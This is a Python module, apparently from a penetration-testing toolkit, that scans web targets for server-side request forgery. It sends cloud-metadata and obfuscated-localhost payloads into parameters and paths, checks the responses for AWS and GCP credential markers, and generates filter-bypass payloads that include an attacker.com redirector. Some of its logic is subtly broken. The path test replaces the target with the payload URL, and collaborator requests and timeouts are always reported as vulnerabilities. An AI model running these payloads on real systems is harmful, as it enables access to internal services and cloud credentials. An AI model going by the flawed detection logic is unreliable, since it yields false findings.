"""
SSRF Validator

Validates potential SSRF endpoints with:
- Various bypass techniques
- Integration with Burp Collaborator/Interactsh
- Common payload testing
"""

import requests
import socket
import time
from typing import Dict, List, Optional, Set
from urllib.parse import urlparse, urljoin
import re


class SSRFValidator:
    """Validate SSRF vulnerabilities"""
    
    # Common SSRF payloads
    PAYLOADS = [
        'http://127.0.0.1',
        'http://localhost',
        'http://0.0.0.0',
        'http://169.254.169.254',  # AWS metadata
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal',  # GCP metadata
        'http://[::1]',  # IPv6 localhost
        'http://2130706433',  # Decimal localhost
        'http://0x7f000001',  # Hex localhost
        'http://017700000001',  # Octal localhost
    ]
    
    def __init__(self, timeout: int = 10, collaborator_url: Optional[str] = None):
        """
        Initialize SSRF validator
        
        Args:
            timeout: Request timeout in seconds
            collaborator_url: Burp Collaborator or Interactsh URL
        """
        self.timeout = timeout
        self.collaborator_url = collaborator_url
        
    def validate(self, url: str, params: Optional[Dict] = None) -> List[Dict]:
        """
        Validate potential SSRF on a URL
        
        Args:
            url: Target URL to test
            params: Optional parameters to include
            
        Returns:
            List of potential SSRF vulnerabilities
        """
        vulnerabilities = []
        
        # Test URL parameters
        if params:
            for param in params:
                vulns = self._test_parameter(url, param, params)
                vulnerabilities.extend(vulns)
                
        # Test URL path injection
        path_vulns = self._test_path_injection(url)
        vulnerabilities.extend(path_vulns)
        
        return vulnerabilities
    
    def _test_parameter(self, url: str, param: str, 
                       params: Dict) -> List[Dict]:
        """Test a specific parameter for SSRF"""
        vulnerabilities = []
        
        for payload in self.PAYLOADS:
            test_params = params.copy()
            test_params[param] = payload
            
            try:
                # Measure response time
                start_time = time.time()
                response = requests.get(
                    url,
                    params=test_params,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                elapsed = time.time() - start_time
                
                # Check for indicators of SSRF
                if self._check_ssrf_indicators(response, payload, elapsed):
                    vulnerabilities.append({
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'type': 'SSRF',
                        'severity': 'HIGH',
                        'description': f'Possible SSRF via parameter {param}',
                        'response_code': response.status_code,
                        'response_time': elapsed,
                    })
                    
            except requests.Timeout:
                # Timeout might indicate successful internal request
                vulnerabilities.append({
                    'url': url,
                    'parameter': param,
                    'payload': payload,
                    'type': 'SSRF_TIMEOUT',
                    'severity': 'MEDIUM',
                    'description': f'Request timeout with payload (possible SSRF)',
                })
            except requests.RequestException:
                pass
                
        # Test with collaborator if available
        if self.collaborator_url:
            collab_vuln = self._test_with_collaborator(url, param, params)
            if collab_vuln:
                vulnerabilities.append(collab_vuln)
                
        return vulnerabilities
    
    def _test_path_injection(self, url: str) -> List[Dict]:
        """Test for SSRF via URL path manipulation"""
        vulnerabilities = []
        parsed = urlparse(url)
        
        for payload in self.PAYLOADS:
            # Try appending payload to path
            test_url = urljoin(url, payload)
            
            try:
                start_time = time.time()
                response = requests.get(
                    test_url,
                    timeout=self.timeout,
                    allow_redirects=False
                )
                elapsed = time.time() - start_time
                
                if self._check_ssrf_indicators(response, payload, elapsed):
                    vulnerabilities.append({
                        'url': test_url,
                        'type': 'SSRF_PATH',
                        'severity': 'HIGH',
                        'description': 'Possible SSRF via URL path manipulation',
                        'response_code': response.status_code,
                    })
                    
            except requests.RequestException:
                pass
                
        return vulnerabilities
    
    def _test_with_collaborator(self, url: str, param: str, 
                                params: Dict) -> Optional[Dict]:
        """Test with Burp Collaborator or Interactsh"""
        if not self.collaborator_url:
            return None
            
        test_params = params.copy()
        test_params[param] = self.collaborator_url
        
        try:
            response = requests.get(
                url,
                params=test_params,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # Note: Actual verification requires checking collaborator logs
            # This is a placeholder for the test
            return {
                'url': url,
                'parameter': param,
                'type': 'SSRF_COLLABORATOR',
                'severity': 'HIGH',
                'description': f'SSRF test with collaborator URL sent. Check collaborator logs.',
                'collaborator_url': self.collaborator_url,
            }
            
        except requests.RequestException:
            pass
            
        return None
    
    def _check_ssrf_indicators(self, response, payload: str, 
                              elapsed: float) -> bool:
        """Check response for SSRF indicators"""
        # Check for AWS metadata in response
        if '169.254.169.254' in payload:
            aws_indicators = [
                'ami-id',
                'instance-id',
                'instance-type',
                'security-credentials',
            ]
            content_lower = response.text.lower()
            if any(indicator in content_lower for indicator in aws_indicators):
                return True
                
        # Check for GCP metadata
        if 'metadata.google.internal' in payload:
            gcp_indicators = [
                'computeMetadata',
                'instance/id',
                'instance/name',
            ]
            if any(indicator in response.text for indicator in gcp_indicators):
                return True
                
        # Check for localhost indicators
        if any(local in payload for local in ['127.0.0.1', 'localhost', '[::1]']):
            # Unusual response time might indicate internal request
            if elapsed > 2.0:
                return True
            # Check for common localhost service responses
            localhost_indicators = [
                'apache',
                'nginx',
                'it works',
                'welcome to',
            ]
            content_lower = response.text.lower()
            if any(indicator in content_lower for indicator in localhost_indicators):
                return True
                
        return False
    
    def generate_bypass_payloads(self, target: str) -> List[str]:
        """
        Generate bypass payloads for common SSRF filters
        
        Args:
            target: Target internal URL
            
        Returns:
            List of bypass payloads
        """
        payloads = [target]
        
        # URL encoding
        payloads.append(target.replace('/', '%2F'))
        
        # Double encoding
        payloads.append(target.replace('/', '%252F'))
        
        # Alternative IP representations
        if '127.0.0.1' in target:
            payloads.extend([
                target.replace('127.0.0.1', 'localhost'),
                target.replace('127.0.0.1', '0x7f000001'),
                target.replace('127.0.0.1', '2130706433'),
                target.replace('127.0.0.1', '127.1'),
            ])
            
        # Add redirector
        payloads.append(f"http://attacker.com/redirect?url={target}")
        
        return payloads


def validate_ssrf(urls: List[str], 
                  collaborator_url: Optional[str] = None,
                  **kwargs) -> Dict[str, List[Dict]]:
    """
    Convenience function to validate SSRF on multiple URLs
    
    Args:
        urls: List of URLs to test
        collaborator_url: Optional Burp Collaborator/Interactsh URL
        **kwargs: Additional arguments for SSRFValidator
        
    Returns:
        Dictionary mapping URLs to vulnerabilities
    """
    validator = SSRFValidator(collaborator_url=collaborator_url, **kwargs)
    results = {}
    
    for url in urls:
        try:
            vulns = validator.validate(url)
            if vulns:
                results[url] = vulns
        except Exception as e:
            print(f"[!] Error validating {url}: {str(e)}")
            
    return results
